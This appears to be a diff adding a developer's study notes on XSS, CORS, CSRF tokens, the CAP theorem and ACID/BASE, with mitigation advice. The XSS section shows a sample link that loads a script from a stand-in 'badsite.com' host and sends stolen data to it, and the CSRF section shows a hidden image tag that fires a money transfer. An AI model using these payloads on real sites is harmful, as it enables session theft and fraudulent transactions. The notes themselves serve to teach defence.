@@ -1,0 +1,274 @@
+Cross Site Scripting
+====================================
+----
+Injection Theory
+-------------------
+
+° Injection is an attacker's attempt to send data to an application
+in a way that will change the meaning of the commands being sent
+to an interpreter.
+
+° Typical interpreters in the web environment:
+ ° SQL
+ ° LDAP
+ ° Operating System
+ ° XPath
+ ° XQuery
+ ° Expression Language
+
+° The command interface + data = susceptible
+
+° Cross-site scripting is HTML injection
+
+° Interpreters run with a lot of access
+
+° Poorly thought through security
+
+----
+What is Cross Site Scripting?
+-----------------------------------
+
+° Cross-Site Scripting (XSS) is a type of injection attack
+° Malicious scripts are injected into trusted websites
+° XSS PHP Example:
+ ° echo "The value you entered is: ".$\_GET['val'];
+ ° https://example.com/test.php?val=123
+
+----
+Reflected XSS Vulnerability
+-------------------------------------------
+
+° The attacker sends a link to a victim:
+ ° Example: https://example.com/test.php?val=<script src="http://badsite.com/badscript.js"></script>
+° The victim clicks the link ad visits the site.
+° The vulnerability loads a script from an external site into the
+target page.
+° The script has full access to the browser DOM environment.
+° The script performs a malicious action as the signed-in user:
+ ° http://badsite.com/badPretendImage.jpg?stolendata=secretDataValues
+
+----
+Stored XSS Vulnerabilities
+---------------------------------------------
+° A stored XSS attack is more dangerous than a reflected vuln:
+ ° A stored XSS attack can be automated.
+ ° A victim in a stored XSS attack doesn't have to take any action
+° Malicious data is stored in a database or some other storage
+mechanism.
+° When a visitor visits the site the malicious action is executed.
+
+-----
+How to Mitigate XSS Vulnerabilities
+--------------------------------------------------
+
+° HttpOnly flag: This is going to prevent JavaScript from 
+accessing cookies, which can have some very sensitive data.
+° Validate your data:
+ ° Is the data an integer (0 to 9 digits only)?
+ ° Is the data a float with a decimal point allowed (0-9 and .)?
+ ° Is the data numbers and dashes, eg. a credit card date field?
+ ° Is the data a string with numbers, letters, spaces and punct?
+° Escape and sanitize your data.
+
+=======
+CORS Headers
+===================================
+----
+What is CORS?
+------------------
+
+° Cross-Origin Resource Sharing uses additional HTTP headers that
+tell a browser to let a web application running at one origin have
+permission to access selected resources from a server at a diff
+origin.
+
+° A cross-origin HTTP request is made when a resource has a 
+different origin.
+
+° IE. domain, protocol and port.
+
+-----
+What requests use CORS?
+------------------------------------------
+° XMLHttpRequest or Fetch APIs in a corss-site manner
+° Web Fonts
+° WebGL textures
+° Images/video
+° Stylesheets
+° Scripts
+
+----
+Pre-flight request
+---------------------------------------------
+
+° A preflight request is used to check if requested is allowed.
+° The following HTTP request methods use a preflight request:
+ ° PUT
+ ° DELETE
+ ° CONNECT
+ ° OPTIONS
+ ° TRACE
+ ° PATCH
+° The Preflight requests use the OPTIONS header.
+
+-----
+CORS Headers
+------------------------------------------------
+° Access-Control-Allow-Origin: Its going to indicate whether or 
+not the response can be shared.
+° Access-Control-Allow-Credentials: Its going to indicate whether
+the response to the request can be exposed when the credential 
+flag is set to true.
+° Access-Control-Allow-Headers: This is going to be used with a
+preflight request to indicate which HTTP headers can be used when
+making the actual request.
+° Access-Control-Allow-Methods: And again this is going to be used
+with a preflight request and this is going to tell the client what
+methods are allowed again, PUT, DELETE and things like that.
+° Access-Control-Expose-Headers: This is going to indicate which
+headers can be exposed as part of the response and it's going to
+list them by their names.
+° Access-Control-Max-Age: This is how long a preflight requests 
+can be cached.
+° Access-Control-Request-Headers: Used with preflight request and
+lets the server know which HTTP headers will be used when the 
+actual request comes through.
+° Access-Control-Request-Method: Preflight request, its going to
+let the server know which HTTP methods will be used when the 
+actual request is made.
+° Origin: Indicates where the fetch originally came from.
+
+There is a npm module called cors and what this allow us to do 
+is set-up CORS headers.
+
+index.js:
+
+express = require('express');
+cors = require('cors');
+
+const PORT = process.env.PORT || 3000;
+const app = express();
+
+app.use(cors());
+
+app.get('/demo', function(req, res)){
+  res.json(
+    [
+      {
+        "first_name": "Bob",
+        "last_name": "Dobbs"
+      },
+      {
+        "first_name": "Jane",
+        "last_name": "Doe"
+      }
+    ]
+  );
+});
+
+app.listen(PORT, function() {
+  console.log(`Server is listening on port ${PORT}`);
+});
+
+JavaScript:
+fetch('http://server.com:3000/demo')
+  .then(r => console.log(r))
+
+
+=======
+CSRF Tokens
+==================================
+-----
+What is CSRF
+------------------------------------
+
+Cross-Site Request Forgery this is a type of attack that tricks
+the victim's browser into executing some malicious requests.
+
+The attack can go enforce the victim's browser to go and perform a
+state changing request, like transferring funds or changing your
+email address.
+
+----
+CSRF Attack
+------------------------------------------
+<img src="http://example.com/transfermoney.php?to=attackeraccnt&amount=10000" height="10px" width="10px">
+<a src="http://example.com.hackersite.com/" height="10px" width="10px">Click Me I'm Harmless!</a>
+
+-----
+What is an Anti-CSRF Token?
+---------------------------------------------
+
+° Anti-CSRF tokens are used to prevent attackers issuing requests
+by the victim:
+ ° User issues a request to the web server
+ ° The server calculates two Crypographically related tokens and 
+sends it to the user with the response
+ ° One token is send as a hidden field in the form
+ ° Tokens are randomly generated per request
+ ° The other is sent in Set-Cookie header of the response
+ ° The two tokens are sent back to the server
+ ° The server compares these two tokens for forgery/malformation
+ ° The token match the server validates the request
+ ° The tokens don't match the server returns an error
+
+======
+CAP Theorem
+=================================
+----
+What is CAP Theorem?
+-----------------------------------------
+
+° CAP Theorem, also named Brewer's theorem
+
+° Created by Eric Brewer
+
+It specifically deals with distributed data stores.
+
+° Consistency: Every read receives the most recent write or an 
+error.
+
+° Availability: Every request receives a (non-error) response:
+ ° No guarantee that it contains the most recent write.
+
+° Partition tolerance: System continues to operate despite the
+arbitrary number of messages being dropped (or delayed) by the
+network.
+
+° You can only pick two
+
+=====
+ACID and BASE
+================================
+
+ACID deals primarily with relational databases and BASE with NoSQL
+
+----
+What is ACID
+------------------------
+
+° Database transactions are a single logical unit of work
+ ° Accesses data
+ ° Modify data
+° Transactions need follow properties to maintain consistncy in a
+database
+° ACID
+ ° Atomicity: Either all of it is going to take place at once, or
+   it simply just does'nt happen at all.
+ ° Consistency: The correctness of the database.
+ ° Isolation: Multiple transactions can occur without leading to
+   any kind of inconsistency in the database state.
+ ° Durability: Not losing the transaction.
+
+----
+What is BASE?
+--------------------
+
+° NoSQL Databases
+° BASE:
+ ° Basically Available: Database appears to work all the time.
+ ° Soft state: it doesn't have to be right consistent and replicas
+   don't exactly have to be mutually consistent all the time.
+ ° Eventual consistency: Eventually everything's going to go and
+   get caught up.
+° Much looser than ACID guarantees.
